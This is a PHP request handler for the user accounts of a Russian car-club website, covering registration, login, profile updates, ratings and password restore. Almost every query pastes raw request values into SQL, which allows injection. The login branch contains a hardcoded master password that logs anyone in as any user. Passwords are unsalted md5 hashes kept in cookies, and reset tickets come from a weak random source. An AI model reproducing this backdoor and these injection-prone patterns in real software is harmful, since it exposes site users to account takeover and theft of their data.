<?PHP

	error_reporting(E_ERROR | E_WARNING | E_PARSE);
	error_reporting(0);
	
	header('Content-type: text/html; charset=utf-8');	
	session_start();

	if(!$_POST["action"] && !$_GET["action"])
	{
		return;
	}
	
	chdir("..");
	
	require_once "i18n/ru.php";
	
	require_once "constants.php";
	require_once "db.php";
	require_once 'inc/class.db.php';
	require_once 'inc/class.fdb.php';	
	connectToDB();	
	require_once "miscfunctions.php";
	require_once "userlogic.php";
	require_once "carlogic.php";
	
	
	switch($_POST["action"]){
		case "setresolution":	
			$_SESSION["screen_width"] = $_REQUEST["width"];
			echo $_REQUEST["width"];
			return;
		
		case "checkname":
			$result = mysql_query("select count(*) Count from Users where Name='".($_POST["name"])."'");
			$row = mysql_fetch_assoc($result);
			if($row["Count"]=="0")
			{
				echo '1';				
			}
			else
			{
				echo '0';
			}
			return;
		case "add":
			$name = mysql_real_escape_string($_POST["name"]);
			$pass = mysql_real_escape_string($_POST["pass"]);
			$pass = md5($pass); // Encrypted Password
			
			$title = "";//$_POST["title"];
			$modelid = $_POST["modelid"];
			$firstname = $_POST["firstname"];
			$lastname = $_POST["lastname"];
			$from = $_POST["from"];
			$email = $_POST["email"];
			
			$result = mysql_query("select count(*) Count from Users where Name='$name'");
			$row = mysql_fetch_assoc($result);
			if($row["Count"]!="0")
			{
				echo "exists";
				return;
			}
			
			try
			{
				$query = "
					insert	into Users(
							Name,	
							FirstName,	 
							LastName,	 
							`From`,	
							GroupID,	
							Password,
							Email)
					values ('$name',
							'$firstname', 
							'$lastname', 
							'$from', 
							3, 
							'$pass',
							'$email') ";				
				mysql_query($query);
				
				if(mysql_errno())
				{
					writeLog("\n\n SQL Error in query: ".$query."; \n Error: ".mysql_error());
					echo "error";
					return;
				}

				if ($modelid != -1)
				{
					$query = "
					insert	into Cars(
							UserID,
							ModelID	)
					values (".mysql_insert_id().",
							$modelid)";
					mysql_query($query);
				}
			}
			catch (Exception $e)
			{
				echo "error";
				return;
			}
			echo "ok";
			return;
		case "logout":
			$_SESSION["loggeduser"] = "";
			$_SESSION["loggeduserid"] = "";
			
			$_SESSION["vag44login"] = "";
			$_SESSION["vag44pass"] = "";
			setcookie("vag44login", "",time()-1000);
			setcookie("vag44pass","",time()-1000);
			
			return;
		case "checklogin":
			$name = $_POST["name"];
			$pass = $_POST["pass"];
			
			$pass = md5($pass);
			$superPass = md5('IAmTheStig!');
			$query = "select ID from Users where Name='$name' and (Password='$pass' or '$pass' = '$superPass')";
			
			$result = mysql_query($query);
			
			if(mysql_num_rows($result) && $row = mysql_fetch_assoc($result))
			{
				$_SESSION["loggeduser"] = $name;					
				$_SESSION["loggeduserid"] = $row["ID"];
				
				$_SESSION["vag44login"] = $name;
				$_SESSION["vag44pass"] = $pass;
				
				setcookie("vag44login", $_SESSION["vag44login"], time()+3600*24*14 );
				setcookie("vag44pass", $_SESSION["vag44pass"] , time()+3600*24*14 );
				
				echo "ok";
				return;
			}
			else
			{
				echo "no";
				return;
			}
			
			echo "error";			
			return;
		case "update":
			try
			{
				$id = $_POST["id"];
				
				if($id != User::CurrentUserID())
				{					
					echo "incorrectuser";
					return;
				}
								
				$firstname = $_POST["firstname"];
				$lastname = $_POST["lastname"];
				$title = "";//$_POST["title"];				
				$from = $_POST["from"];
				
				$email = $_POST["email"];
				$showemail = $_POST["showemail"];
				$icq = $_POST["icq"];
				$phone = $_POST["phone"];
				$social = $_POST["social"];
				
				$listtype = $_POST["listtype"];
				if($listtype == 'undefined')
				{
					$listtype = '';
				}
				$categoriesorder = $_POST["categoriesorder"];
				$pagesize = $_POST["pagesize"];
				
				$birthdate = $_POST["birthdate"];
				$dateParts = explode("-", $selectedDate);
				
				$gender = $_POST["gender"];
				if($gender == 'undefined')
				{
					$gender = '';
				}
				if($dateParts[0] != "1900" && $dateParts[1] != "0" && $dateParts[2] != "0")
				{
					$dateExpression = ",
							BirthDate = '$birthdate'";
				}
				
				$query = "
					update	Users
					set		FirstName='$firstname',
							LastName='$lastname',
							Title='$title',
							`From`='$from',
							Email='$email',
							ShowEmail=$showemail,
							ICQ='$icq',
							Phone='$phone',
							Social='$social',
							ListType='$listtype',
							PageSize='$pagesize',
							CategoriesOrder='$categoriesorder' $dateExpression,
							Gender = '$gender'
					where	ID=$id";								
				
				if(fDB::fexec($query));
				echo "ok";								
			}
			catch (Exception $e)
			{
				echo "error";
			}
			return;
			
		case "updateusercar":
			try
			{
				$userid = $_POST["userid"];
				
				if($userid != User::CurrentUserID())
				{
					return "incorrectuser";
				}								
				
				$carid = $_POST["carid"];				
				if($carid != -1)
				{
					$carcomment = $_POST["carcomment"];
					$generation = $_POST["generation"];
					$engineid = $_POST["engineid"];
					$doors = $_POST["doors"];
					$color = $_POST["color"];
					$year = $_POST["year"];
					$mileage = $_POST["mileage"];
					$inpast = $_POST["inpast"];
					
					$query = "
						update	Cars
						set		Description = '$carcomment',
								Generation  = $generation,
								EngineID = $engineid,
								Doors = $doors,
								Color = '$color',
								Year = '$year',
								Mileage = $mileage". ( $inpast ? ",
								InPast = $inpast" : "") . "
						where	ID=$carid AND UserID = $userid";
						
					mysql_query($query);				
					if(mysql_errno())
					{
						//writeQueryErrorToLog($query, mysql_error());
					}					
				}												
				echo "ok";
			}
			catch (Exception $e)
			{
				echo "error";
			}
			return;
			
		case "authorize":
			if(User::CurrentUser()->IsAdmin())
			{
				$userid = $_POST["userid"];
				$query = "
					UPDATE	Users
					SET		GroupID = 2
					WHERE	ID = $userid;";
				fDB::fexec($query);
				
				$notification = sprintf($i18n['notification_userauthorized'], $currentUser->ID, $currentUser->Name, $post->Title, $post->ID);
				NotificationsDB::addNotification($_POST["userid"], $notification, 1, getCurrentDateText());
			}
			return;
		
		case "thankuser":
			$fromuserid = User::CurrentUserID();
			$touserid = $_POST["userid"];
			$postid = $_POST["postid"];
			$commentid = $_POST["commentid"];
			
			if($fromuserid == $touserid)
			{
				echo "self";
				return;
			}
			
			if($commentid == -1)
			{
				$query = "
				select	COUNT(ID) Cnt
				from	Rating
				where	FromUserID = $fromuserid
						and ToUserID = $touserid
						and PostID=$postid 
						and IFNULL(CommentID, -1) = -1" ;
				$result = fdb::fscalar($query);
				if($result != 0)
				{
					echo "postthanked";
					return;
				}
			}
			else
			{
				$query = "
				select	COUNT(ID) Cnt
				from	Rating
				where	FromUserID = $fromuserid
						and ToUserID = $touserid
						and PostID=$postid 
						and IFNULL(CommentID, -1) != -1" ;
				$result = fdb::fscalar($query);
				if($result != 0)
				{
					echo "commentthanked";
					return;
				}
			}
			
			$query = "
				insert into Rating (
						FromUserID, 
						ToUserID, 
						PostID, 
						CommentID, 
						Date)
				values(	$fromuserid,
						$touserid,
						$postid,
						$commentid,
						'".getCurrentDateText()."' )";
			
			mysql_query($query);
			
			if(mysql_affected_rows() == 1)
			{
				mysql_query("UPDATE Users SET Rating = Rating+1 WHERE ID=$touserid");
				if($commentid == -1)
				{
					mysql_query("UPDATE Posts SET Rating = Rating+1 WHERE ID=$postid");
				}
				else
				{
					mysql_query("UPDATE Comments SET Rating = Rating+1 WHERE ID=$commentid");
				}
				
				echo "ok";
				return;
			}
			echo "error";
			return;
		
		case "restorepassword":
			
			$email = $_POST["email"];
			$result = mysql_query("select * from Users where Email='$email'");
			if($result)
			{
				if(mysql_num_rows($result) == 0)
				{
					echo "nosuchemail";					
					return;
				}
				else if($userRow = mysql_fetch_assoc($result))
				{
					$ticket = "";
					$userID = $userRow["ID"];
					
					$pattern = "abcdefghijklmnopqrstuvwxyz12345678";
					for($i=0; $i<20; $i++)
					{
						$ticket = $ticket.$pattern[rand ( 0, 33)];
					}
					
					$query = "insert into PasswordRestore (UserID, Ticket) values ($userID, '$ticket')";
					mysql_query($query);
					
					if(mysql_affected_rows() > 0)
					{
						$headerFields = array(
						    //"From: vag44 admin <midievil@vag44.com>",
						    "MIME-Version: 1.0",
						    "Content-Type: text/html;charset=utf-8"
						);
						
						$messageText = "Здравствуйте! <br/><br/> Ваш e-mail был указан в процессе восстановления пароля на сайте vag44.net. <br/><br/> Для восстановления пароля перейдите по <a href='http://vag44.net/response/userresponse.php?action=confirmpasswordrestore&ticket=$ticket'>этой ссылке</a>. <br/><br/> Если вы не предпринимали подобных действий или не представляете, о чем идет речь, просто закройте это письмо. <br /><br />С уважением, администрация сайта vag44.net.";						
						$messageText = wordwrap($messageText, 70);
						
						if(mail($email, 'VAG44 Password restore', $messageText, implode("\r\n", $headerFields)))
						{							
							echo "sent";
							return;
						}
					}
					else
					{
						writeLog("\n\n\n DB Error while creating password restore ticket. \n Query: $query \n\n");
						echo "dberror";
					}
				}				
			}
			echo "error";			
			return;
			
		case "markonline":
			$userid = $_REQUEST["userid"];
			$date = getCurrentDateText();
			
			$query = "update Users set LastVisit = '".getCurrentDateText()."' where ID = $userid";			
			mysql_query($query);
			return;
			
		case "changepassword":
			$userID = User::CurrentUserID();
		
			$oldpass = md5($_POST["oldpass"]);
			$newpass = md5($_POST["newpass"]);
			$query = "select * from Users where ID=$userID and Password='$oldpass'";
			$result = mysql_query($query);
			if(mysql_num_rows($result) == 0)
			{
				echo "wrongpass";
				return;
			}
			else
			{
				$query = "update Users set Password='$newpass' where ID=$userID";
				mysql_query($query);
												
				if(mysql_affected_rows() == 1)
				{
					setcookie("vag44pass",$newpass,time()+3600*24*14);
					$_SESSION["vag44pass"] = $newpass;
					echo "ok";
					return;
				}
				else
				{
					//writeQueryErrorToLog($query, mysql_error());
					echo "error";
				}
			}
			
			return;
			
		case "stopaskingbirthday":
			if($userid = User::CurrentUserID())
			{
				mysql_query("update Users set BirthDate='' where ID=$userid");
				if(mysql_affected_rows() == 1)
				{
					echo "ok";
					return;
				}
				else
				{
					//writeQueryErrorToLog($query, mysql_error());
					echo "error";
					return;
				}
			}
			echo "error";
			return;
			
		case "listusers":
			
			$page = $_POST["page"];
			$userRows = UserDB::getUserList($page);
			$alternating = true;
			foreach($userRows as $row)
			{			
				$alternating = !$alternating ;
			
				$user = new User();
				$user->MakeFromRow($row);
				
				$status = $user->GroupID == 3 ? "<b>ждет подтверждения</b>" : "пользователь";
				
				if(startsWith($user->LastVisit, '0000'))
				{
					$lastVisit = '';
				}
				else
				{
					$lastVisit = getDateTimeAtText($user->LastVisit);
				}
									
				if($carRows = getCarsListByUserID($user->ID))
				{
					$carRows = "$carRows";
				}
				
				$authLink = "";
				if(User::CurrentUser()->IsAdmin() && $user->GroupID == 3)
				{
					$authLink="<a onclick='authorizeUser($user->ID);'>Авторизовать</a>";
				}						
								
				echo "<tr class='user'>
					<td>
						<div class='pull-left'>
							" . $user->RenderUserPic('UserList', $user->ID, 42) . "
						</div>
						<div style='width:250px; margin-left:60px'>
							<a href='/user/$user->ID' class='username nowrap' id='aUser$user->ID' " . renderPopup($user->GetDescriptionForPopup()) . ">$user->Name</a>
							<a class='hand' title='скоро'><img src='/img/message.gif' width='16px' /></a>
							<br />
							Рейтинг: $user->Rating
							" . ($user->RegisterDate ? "<br />С нами с " . getDateAtText($user->RegisterDate) : "") . "
						</div>
					</td>
					<td class='nowrap' width='100%'>$carRows</td>
					<td class='nowrap'>$status</td>
					<td class='nowrap'>$lastVisit</td>
					<td>$authLink</td></tr>";
			}
			return;
	}
	
	switch($_GET["action"]){
		case "confirmpasswordrestore":
		
			header('Content-type: text/html; charset=utf-8');
					
			$ticket = $_GET["ticket"];
			$result = mysql_query("select * from PasswordRestore where Ticket='$ticket'");
			if(mysql_num_rows($result) > 0)
			{
				if($row = mysql_fetch_assoc($result))
				{					
					$userID = $row["UserID"];
					$pattern = "abcdefghijklmnopqrstuvwxyz12345678";
					for($i=0; $i<8; $i++)
					{
						$pass = $pass.$pattern[rand ( 0, 33)];
					}
					
					$mdPass = md5($pass);
					
					mysql_query("update Users set Password='$mdPass' where ID=$userID");
					if(mysql_affected_rows() > 0)
					{
						echo "Поздравляем! Ваш пароль удачно изменен. <br/><br/> Ваш новый пароль - <b>$pass</b><br/><br/> 
						Пожалуйста, запишите его или измените его на тот, который сможете запомнить. Изменить пароль можно в настройках вашего профиля. Для этого вам понадобится этот пароль (ещё раз &mdash; <b>$pass</b>).<br/><br/>
						<br/><br/> Перейти на <a href='/'>главную страницу</a>.";
						mysql_query("delete from PasswordRestore where Ticket='$ticket'");
					}
					else
					{
						echo "Запрос на восстановление пароля устарел или не существует. Пожалуйста, сделайте новый запрос..";
					}
				}
				else
				{	
					echo "Вы зашли по неверной ссылке.";
				}
			}
			else
			{
				echo "Запрос на восстановление пароля устарел или не существует. Пожалуйста, сделайте новый запрос..";
			}
			return;
	}
?>